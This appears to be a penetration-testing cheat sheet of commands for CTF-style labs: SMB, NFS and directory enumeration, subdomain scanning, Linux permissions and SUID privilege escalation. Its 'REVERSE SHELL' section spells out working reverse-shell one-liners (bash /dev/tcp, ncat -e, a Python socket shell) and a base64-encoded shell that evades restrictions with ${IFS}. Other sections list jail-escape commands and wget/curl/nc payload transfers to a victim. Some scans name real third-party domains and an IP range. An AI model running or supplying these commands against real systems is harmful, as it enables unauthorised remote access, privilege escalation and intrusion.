SMB Enumeration<br>
nmap -sC --script=smb* -p139,445 target<br>
nmap --script=smb-vuln* -p139,445 target<br>
msf5 > use auxiliary/scanner/smb/smb_version<br>
<br>
For UDP scan<br>
nmap -sU -O -p- -oA nmap/udp 10.10.10.4<br>
<br>
DIR Enumeration<br>
dirsearch -u https://10.10.10.60 -w /opt/DirBuster/directory-list-2.3-medium.txt -f -e txt<br><br>
wfuzz -c -z file,/root/SecLists/Discovery/Web-Content/common.txt --hc 404,400 -X GET -u http://10.10.10.160/FUZZ<br><br>
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 20 -e -k -x php,htm,html,txt -u https://10.10.10.7/ <br><br>
SMB Enumeration </br>
nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254 </br>
The -r option is used to specify the originating UDP port as 137, which is used to query the NetBIOS name service for valid NetBIOS names</br>
nbtscan -r 10.11.1.0/24</br>
Nmap SMB NSE Scripts</br>
kali@kali: ls -1 /usr/share/nmap/scripts/smb* </br>
NSE scripts like rpcinfo to find services that may have registered with rpcbind</br>
nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254</br>
nmap -p 111 --script nfs* 10.11.1.72</br>
Nmap scan report for 10.11.1.72</br>
PORT STATE SERVICE</br>
111/tcp open rpcbind</br>
| nfs-showmount:</br>
|_ /home 10.11.0.0/255.255.0.0</br>
In this case, the entire /home directory is being shared and we can access it by mounting it on our
Kali virtual machine. We will use mount to do this,</br>
kali@kali: mkdir home</br>
kali@kali: sudo mount -o nolock 10.11.1.72:/home ~/home/</br>
kali@kali: cd home/ && ls</br>

***<h2>Contains commands,Link and tricks for challenges</h2>***<br>
***COMMON COMMANDS***<br>
**Nmap**<br>
•	nmap -sV -p 1-20000  -iL input.txt -oN output.txt<br>
**masscan probe to establish the open ports in the host.**<br>
•	masscan -e tun0 -p1-65535,U:1-65535 10.10.10.101 --rate=700<br>

**nmap scanning the discovered ports to see what are the services.**<br>
•	nmap -sV -v -O -sS -T5 {target}<br>
**Sudoing User...**<br>

 sudo -l	--> List available commands.<br>
 sudo command --> 	Run command as root.<br>
 sudo -u root command	 --> Run command as root.<br>
 sudo -u user command	-->  Run command as user.<br>

**Subfinder(only subfinder can run large wordlist)**<br>
•	./subfinder -d freelancer.com -o output.txt<br>
**Eyewitness**<br>
•	./EyeWitness.py --headless -f hunchly_dark.txt -d output_dir1 --prepend-https <br>
•	./EyeWitness.py --web --thread 50 -f hunchly_dark.txt -d output_dir1 --prepend-https<br>
•	dnscan.py -d ubnt.com -w /SecLists/Discovery/DNS/bitquark_subdomains_top100K.txt -t 30 -o D_ubnt.txt<br>
•	masscan -p80,443,8080,9090,8081, 66.211.168.0/22 > mass_paypal.txt<br>
•	gobuster -m dns -u target.com -w $wordlist<br>
**installing tab completion**<br>
•	apt-get install bash-completion<br>
**Untar**<br>
•	tar -xvf sqlmap.tar.gz<br>
•	gzip -d file.gz<br>
•	tcpdump port 9009<br>
•	tcpdump -nni eth0 icmp<br>
•	ps -eaf | grep [w]get<br>
•	cat /proc/meminfo<br>
•	cat /proc/cpuinfo<br>
•	wfuzz.py -c -z file,commons.txt --hc 404 -o html http://www.site.com/FUZZ 2> /var/www/html/res.html<br>
•	./parameth.py -u TARGET<br>
•	python linkfinder.py -i https://example.com/1.js -o results.html<br>

**list all file in a directory with permission**<br>
ls -l /home<br>
In the above it is listing all files of home directory with permissions<br>
**list all files with hidden with permission**<br>
ls -al<br>
**show permission of directory or file**<br>
ls -ld<br>
**Dir and File Bruteforce or enumeration**<br>
*WFUZZ*<br>
wfuzz -c -z file,/root/SecLists/Discovery/Web-Content/common.txt --hc 404,400 -X GET -u http://10.10.10.160/FUZZ<br>

**Gobuster Dir enumeration**<br>
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 20 -e -k -x php,htm,html,txt -u https://10.10.10.7/<br>

**REVERSE SHELL**<br>

Victim: ncat -e /bin/bash {IP} {PORT}<br>
Attacker: Machine:nc -lvnp {PORT}<br>
python -m SimpleHTTPServer 9999<br>
Victim: bash -i >& /dev/tcp/{IP}/{PORT} 0>&1<br>

Attacker: Machine:nc -lvnp {PORT}<br>
Victim(Base64): echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85MDA3IDA+JjE|base64${IFS}-d|bash${IFS}-;<br>

Attacker:nc 192.168.1.102 4444 -e /bin/sh <br>
Victim:nc -lvp 4444 <br>
Attacker:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<br>
Victim:nc -lvp 1234<br>
Note:In the above payload python will run and creating bash shell.But while sometimes trying to put commands it throws error like you have to run through terminal.For that Run Below command to work properly<br>
<br>
python3 -c 'import pty; pty.spawn("/bin/sh")'<br>
<br>
 Related Shell Escape Sequences...If commands are limited, you break out of the "jail" shell?
 
    python-->python3 -c 'import pty; pty.spawn("/bin/sh")'
    vi-->   :!bash
    vi-->   :set shell=/bin/bash:shell
    awk-->  awk 'BEGIN {system("/bin/bash")}'
    find--> find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
    perl--> perl -e 'exec "/bin/bash";'
    
Checking Path <br>
echo $PATH<br>
Checking current shell<br>
echo $0<br>

**File transfer during REVERSE SHELL**<br>
Attacker: service apache2 start<br>
place shell or exploit in /var/www/html<br>

Attacker:python -m SimpleHTTPServer 9999<br>
Victim: wget 192.168.1.102:9999/file.txt<br>
Victim: curl -O http://192.168.0.101/file.txt<br>

Attacker:nc -lvp 4444 < /root/home/exploit.txt<br>
Victim:nc 192.168.1.102 4444 > exploit.txt<br>

Attacker: python -m SimpleHTTPServer 9999<br>
Victim: curl -O http://192.168.0.101/file.txt <br>


**bypass-bash-restrictions**<br>
https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions<br>

**Bypass shell restriction using {IFS} and Base 64 encoding**

```echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85MDA3IDA+JjE|base64${IFS}-d|bash${IFS}-;```<br>
it means the highlighted part below is base64 encoded to bypass shell restriction<br>
echo${IFS}**bash -i >& /dev/tcp/10.10.14.94/9007 0>&1**|base64${IFS}-d|bash${IFS}-;<br>
**Understanding Linux File and directory permissions**<br>
d 	r 	w 	x 	r 	w 	x 	r 	w 	x  t<br>
Dir	    Owner 	   Group 	       Other <br>
Directory 	Read 	Write 	Execute 	Read 	Write 	Execute 	Read 	Write 	Execute <br>
t is sticky flag restricted to executed by owner
If any of these letters is replaced with a hyphen (-), it means that permission is not granted.For example <br>
drwxr-xr-x<br>
    A folder which has read, write and execute permissions for the owner, but only read and execute permissions for the group and exe for other users.<br>
-rw-rw-rw-<br>
    A file that can be read and written by anyone, but not executed at all.<br>
    
 netstat -lntp<br>   
**Understanding Linux File and directory permissions Using Numbers**<br>
No (R) 	 (W) 	(X)<br>
0 	          No 	   No 	           No<br>
1 	          No     No 	           Yes<br>
2 	          No 	   Yes 	            No<br>
3 	          No 	   Yes 	           Yes<br>
4 	          Yes 	  No 	            No<br>
5 	          Yes 	  No 	            Yes<br>
6 	          Yes 	  Yes 	           No<br>
7 	          Yes    	Yes 	          Yes<br>

777 is the same as rwxrwxrwx<br>

755 is the same as rwxr-xr-x<br>
**Searching for root permission file and Binaries or SUID binaries***<br>
![Image description](https://2.bp.blogspot.com/-V6G2dcR6rew/WvxyU3zB5NI/AAAAAAAAW3o/es8P06opgNwUg8gUPjzcLO29dgVYBOOpQCLcBGAs/s1600/0.2.png)<br>
when special permission is given to each user it becomes SUID, SGID, and sticky bits. When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID) and when bit “2” is set to group it becomes SGID (Set Group ID) and  if other users are allowed to create or delete any file inside a directory then sticky bits “1” is set to that directory.<br>
What is SUID Permission?

SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges.  Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges. 

**HOW SUID helps in privilege escalation?**<br>
https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/ <br>
https://www.embeddedhacker.com/2019/12/hacking-walkthrough-thm-linux-privesc-playground/<br>
  **GTFOBins**<br>
https://gtfobins.github.io/<br>

**Getting files and binaries with root permissions**<br>
find / -perm -u=s -type f 2>/dev/null<br>
find / -perm /4000 2>/dev/null <br>
![Image description](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-LT25U7D_AdavNsKUdWf%2F-LT25_VrvhA02WZBj6ca%2Fimage.png?alt=media&token=0d51bea4-1371-4e00-b086-794d486cd950)
</br>
CONNECTING MYSQL</br>
mysql --host=localhost --user=myname --password=password mydb</br>
mysql -h localhost -u myname -ppassword mydb</br>

SMBCLIENT Login</br>
smbclient  //host/home -I 10.11.1.231 -N --option='client min protocol=NT1'</br>
smbclient //10.11.1.31/wwwroot -U Guest </br>


